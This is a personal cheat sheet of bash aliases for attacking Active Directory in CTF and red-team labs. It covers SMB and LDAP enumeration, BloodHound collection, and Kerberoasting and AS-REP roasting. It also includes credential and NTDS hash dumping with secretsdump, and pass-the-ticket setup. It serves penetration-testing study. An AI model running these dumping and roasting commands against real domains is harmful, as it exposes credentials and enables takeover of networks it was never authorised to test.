---
tags:
  - "#github"
  - "#type/template"
  - "#markdown"
  - "#notes"
  - "#cheatsheet"
  - "#active-directory"
  - "#ctf"
  - "#windows-enumeration"
  - "#security"
  - "#network-security"
  - "#programming"
  - "#python-scripting"
  - "#opensource"
  - "#red-team"
  - "#penetration-testing"
description:
author:
created: Sunday, June 29th 2025, 12:44:04 am
source:
title: Page 2 - AD
date modified: Sunday, June 29th 2025, 12:44:14 am
---

# Page 2 - AD

**Active Directory (AD)-related aliases** for CTF players doing **Windows domain enumeration**, **Kerberos abuse**, **SMB attacks**, and **privilege escalation**. These are particularly useful for **internal AD labs**, **HTB Active Directory boxes**, and **Red Team simulations**.

---

## 🏢 Active Directory Enumeration & Attacks

```bash
# 🔎 SMB & NetBIOS
alias smbshare='smbclient -L \\\\TARGET\\ -N'
alias smbconnect='smbclient \\\\TARGET\\SHARE'
alias smbuser='smbclient -L \\\\TARGET\\ -U'
alias enum4='enum4linux-ng -a'
alias enumuser='enum4linux -u USERNAME -p PASSWORD -a TARGET'
alias crackmap='crackmapexec smb'
alias smbmap='smbmap -H'
alias nbtscan='nbtscan -r 10.10.10.0/24'

# 🧠 LDAP & Kerberos
alias kerbrute='python3 ~/tools/kerbrute/kerbrute.py'
alias ldapenum='ldapsearch -x -H ldap://TARGET -s base'
alias adenum='python3 ~/tools/ADEnum/ADEnum.py'
alias bloodhound='bloodhound-python -u USER -p PASSWORD -dc-ip DC_IP -c all'

# 🗂️ Password & Hash Dumping
alias secretsdump='secretsdump.py DOMAIN/USER:PASSWORD@TARGET'
alias dumpntds='secretsdump.py -just-dc DOMAIN/USER:PASSWORD@DC_IP'
alias hashgrab='impacket-secretsdump'
alias ridbrute='rpcclient -U "" TARGET -N -c "enumdomusers"'

# 📜 Kerberos Ticket Attacks
alias asreproast='GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET'
alias kerberoast='GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip TARGET -request'
alias tgt='klist'
alias renewtgt='kinit USERNAME@DOMAIN'
alias ptt='export KRB5CCNAME=FILE:/tmp/krb5cc_1337 && export KRB5_CONFIG=~/krb5.conf'

# 🛠️ Tools & Shortcuts
alias cme='crackmapexec'
impacket() {
  cd ~/tools/impacket && source venv/bin/activate
}
alias blood='cd ~/tools/BloodHound && neo4j console'
alias neo4jstart='sudo systemctl start neo4j'
alias neo4jstop='sudo systemctl stop neo4j'

# 🪓 Attack Chains
alias kerbcheck='nmap --script "krb5-enum-users" -p 88 TARGET'
alias noauthrpc='rpcclient -U "" -N TARGET'
alias authrpc='rpcclient -U USER%PASSWORD TARGET'

# 📚 Active Directory Cheatsheets
alias adhelp='xdg-open https://book.hacktricks.xyz/windows-hardening/active-directory-methodology'
alias privhelp='xdg-open https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation'
```

---

## ✅ Additional Tools Recommended

Make sure you have the following tools installed (some aliases reference them):

- [Impacket](https://github.com/SecureAuthCorp/impacket)
    
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
    
- [Kerbrute](https://github.com/ropnop/kerbrute)
    
- [BloodHound + Neo4j](https://github.com/BloodHoundAD/BloodHound)
    
- [Enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
    
- [ldapsearch (OpenLDAP)](https://linux.die.net/man/1/ldapsearch)
    
- [rpcclient (Samba)](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)

---

## 📥 Install and Activate

To include these in your setup:

### 1. Add to `~/.ctf_aliases` or `.bashrc`/`.zshrc`

```bash
[ -f ~/.ctf_aliases ] && source ~/.ctf_aliases
```

### 2. Then Source It:

```bash
source ~/.ctf_aliases
```

---

## 🧠 Learn More

- [HackTricks: Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
    
- [PayloadsAllTheThings – Windows & AD](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Cheatsheet)
    
- [Red Team Notes by RastaMouse](https://rastamouse.me/)
